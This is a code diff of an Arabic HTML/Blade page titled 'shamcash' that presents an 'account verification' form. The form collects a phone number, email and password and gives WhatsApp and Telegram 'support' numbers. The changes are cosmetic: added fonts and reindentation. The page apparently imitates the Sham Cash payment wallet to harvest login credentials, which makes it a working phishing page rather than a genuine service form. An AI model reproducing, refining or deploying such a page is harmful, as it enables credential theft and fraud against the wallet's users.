@@ -1,18 +1,25 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css">
     <link rel="shortcut icon" href="\logo.e8f94ee2.svg" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Noto+Kufi+Arabic:wght@100..900&display=swap"
+        rel="stylesheet">
     <title>shamcash</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: "Noto Kufi Arabic", sans-serif;
+
         }
 
         body {
@@ -212,134 +219,140 @@
         }
     </style>
 </head>
+
 <body>
-<div class="container">
-    <header class="header">
-        <a href="#" class="lang-switch">الإنكليزية</a>
-        <div class="info-icon" id="infoIcon">i</div>
-    </header>
+    <div class="container">
+        <header class="header">
+            <a href="#" class="lang-switch">الإنكليزية</a>
+            <div class="info-icon" id="infoIcon">i</div>
+        </header>
 
-    <div class="logo">
-        <img src="\logo.e8f94ee2.svg" alt="Logo" style="width: 80%; height: auto;">
-    </div>
-
-    <h1 class="title">توثيق الحساب</h1>
-
-    <form id="validationForm" method="POST" action="{{ route('register') }}">
-        @csrf
-        <div class="form-group">
-            <span class="form-icon"><i style="font-size: 20px; " class="ri-phone-fill"></i></span> <!-- أيقونة الهاتف -->
-            <input type="tel" name="phone" class="form-control" id="phone" placeholder="رقم الهاتف" required>
+        <div class="logo">
+            <img src="\logo.e8f94ee2.svg" alt="Logo" style="width: 80%; height: auto;">
         </div>
 
-        <div class="form-group">
-            <input type="email" name="email" class="form-control" placeholder="بريد الكتروني" required>
-            <span class="form-icon-right"><i class="fa fa-user"></i></span>
-        </div>
+        <h1 class="title">توثيق الحساب</h1>
 
-        <div class="form-group">
-            <input type="password" name="password" class="form-control" placeholder="كلمة السر" id="passwordField" required>
-            <span class="form-icon-right"><i class="fa fa-lock" style="color: black;"></i></span>
-            <span class="form-icon" id="togglePassword"><i class="fa fa-eye" style="color: black; cursor: pointer;"></i></span>
-        </div>
-        <button type="submit" class="btn">توثيق الحساب</button>
-    </form>
-
-    <div class="contact-info">
-        تأكد من تواصل الرسمي من رقم خدمة العملاء<br>
-        +963983115117<br>
-        الموجود في التطبيق
-    </div>
-
-    <div class="footer">
-        <div class="powered-by">
-            POWERED BY<br>
-            Sham Cash ©<br>
-            V 2.0.0
-        </div>
-    </div>
-</div>
-
-<!-- النافذة المنبثقة لمعلومات الاتصال -->
-<div class="contact-popup" id="contactPopup">
-    <div class="popup-content">
-        <div class="popup-header">للتواصل مع الدعم</div>
-        <div class="popup-body">
-            <div class="support-section">
-                <h3>خدمة العملاء:</h3>
-                <div class="contact-item">
-                    <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
-                    <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115117</span>
-                </div>
-                <div class="contact-item">
-                    <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
-                    <span class="contact-text">حساب التلغرام<br>+963983115117</span>
-                </div>
+        <form id="validationForm" method="POST" action="{{ route('register') }}">
+            @csrf
+            <div class="form-group">
+                <span class="form-icon form-icon-right "><i style="font-size: 20px; " class="ri-phone-fill "></i></span>
+                <!-- أيقونة الهاتف -->
+                <input type="tel" name="phone" class="form-control" id="phone" placeholder="رقم الهاتف"
+                    required>
             </div>
-            <hr style="margin: 0; border: none; border-top: 1px solid #ccc;">
-            <div class="support-section technical-support">
-                <h3>الدعم التقني:</h3>
-                <div class="contact-item">
-                    <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
-                    <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115119</span>
-                </div>
-                <div class="contact-item">
-                    <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
-                    <span class="contact-text">حساب التلغرام<br>+963983115119</span>
-                </div>
+
+            <div class="form-group">
+                <input type="email" name="email" class="form-control" placeholder="بريد الكتروني" required>
+                <span class="form-icon-right"><i class="fa fa-user"></i></span>
+            </div>
+
+            <div class="form-group">
+                <input type="password" name="password" class="form-control" placeholder="كلمة السر" id="passwordField"
+                    required>
+                <span class="form-icon-right"><i class="fa fa-lock" style="color: black;"></i></span>
+                <span class="form-icon" id="togglePassword"><i class="fa fa-eye"
+                        style="color: black; cursor: pointer;"></i></span>
+            </div>
+            <button type="submit" class="btn">توثيق الحساب</button>
+        </form>
+
+        <div class="contact-info">
+            تأكد من تواصل الرسمي من رقم خدمة العملاء<br>
+            +963983115117<br>
+            الموجود في التطبيق
+        </div>
+
+        <div class="footer">
+            <div class="powered-by">
+                POWERED BY<br>
+                Sham Cash ©<br>
+                V 2.0.0
             </div>
         </div>
     </div>
-</div>
 
-<script>
-    // التحقق من رقم الهاتف
-    document.getElementById('validationForm').addEventListener('submit', function(event) {
-        const phoneNumber = document.getElementById('phone').value;
-        if (!phoneNumber.startsWith('09')) {
-            alert('يجب أن يبدأ رقم الهاتف بـ 09');
-            event.preventDefault(); // منع إرسال النموذج
-        }
-    });
+    <!-- النافذة المنبثقة لمعلومات الاتصال -->
+    <div class="contact-popup" id="contactPopup">
+        <div class="popup-content">
+            <div class="popup-header">للتواصل مع الدعم</div>
+            <div class="popup-body">
+                <div class="support-section">
+                    <h3>خدمة العملاء:</h3>
+                    <div class="contact-item">
+                        <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
+                        <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115117</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
+                        <span class="contact-text">حساب التلغرام<br>+963983115117</span>
+                    </div>
+                </div>
+                <hr style="margin: 0; border: none; border-top: 1px solid #ccc;">
+                <div class="support-section technical-support">
+                    <h3>الدعم التقني:</h3>
+                    <div class="contact-item">
+                        <span class="contact-icon"><i class="ri-whatsapp-fill"></i></span>
+                        <span class="contact-text">رقم تواصل الواتس اب:<br>+963983115119</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="contact-icon"><i class="fa fa-paper-plane"></i></span>
+                        <span class="contact-text">حساب التلغرام<br>+963983115119</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    // إضافة وظيفة عرض/إخفاء كلمة السر
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordField = document.getElementById('passwordField');
+    <script>
+        // التحقق من رقم الهاتف
+        document.getElementById('validationForm').addEventListener('submit', function(event) {
+            const phoneNumber = document.getElementById('phone').value;
+            if (!phoneNumber.startsWith('09')) {
+                alert('يجب أن يبدأ رقم الهاتف بـ 09');
+                event.preventDefault(); // منع إرسال النموذج
+            }
+        });
 
-    togglePassword.addEventListener('click', () => {
-        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
-        passwordField.setAttribute('type', type);
+        // إضافة وظيفة عرض/إخفاء كلمة السر
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('passwordField');
 
-        // تغيير شكل الأيقونة عند العرض/الإخفاء
-        togglePassword.innerHTML = type === 'password' ?
-            '<i class="fa fa-eye" style="color: black; cursor: pointer;"></i>' :
-            '<i class="fa fa-eye-slash" style="color: black; cursor: pointer;"></i>';
-    });
+        togglePassword.addEventListener('click', () => {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
 
-    // فتح النافذة المنبثقة عند الضغط على أيقونة المعلومات
-    const infoIcon = document.getElementById('infoIcon');
-    const contactPopup = document.getElementById('contactPopup');
+            // تغيير شكل الأيقونة عند العرض/الإخفاء
+            togglePassword.innerHTML = type === 'password' ?
+                '<i class="fa fa-eye" style="color: black; cursor: pointer;"></i>' :
+                '<i class="fa fa-eye-slash" style="color: black; cursor: pointer;"></i>';
+        });
 
-    infoIcon.addEventListener('click', () => {
-        contactPopup.classList.add('show');
-    });
+        // فتح النافذة المنبثقة عند الضغط على أيقونة المعلومات
+        const infoIcon = document.getElementById('infoIcon');
+        const contactPopup = document.getElementById('contactPopup');
 
-    contactPopup.addEventListener('click', (event) => {
-        if (event.target === contactPopup) {
-            contactPopup.classList.remove('show');
-        }
-    });
+        infoIcon.addEventListener('click', () => {
+            contactPopup.classList.add('show');
+        });
 
-       // تحقق من رقم الهاتف عند الكتابة
-    const phoneInput = document.getElementById('phone');
-    phoneInput.addEventListener('input', function () {
-        const phoneValue = phoneInput.value;
-        if (!phoneValue.startsWith("09")) {
-            phoneInput.setCustomValidity("رقم الهاتف يجب أن يبدأ بـ 09");
-        } else {
-            phoneInput.setCustomValidity("");
-        }
-    });
-</script>
+        contactPopup.addEventListener('click', (event) => {
+            if (event.target === contactPopup) {
+                contactPopup.classList.remove('show');
+            }
+        });
+
+        // تحقق من رقم الهاتف عند الكتابة
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', function() {
+            const phoneValue = phoneInput.value;
+            if (!phoneValue.startsWith("09")) {
+                phoneInput.setCustomValidity("رقم الهاتف يجب أن يبدأ بـ 09");
+            } else {
+                phoneInput.setCustomValidity("");
+            }
+        });
+    </script>
 </body>
+
 </html>
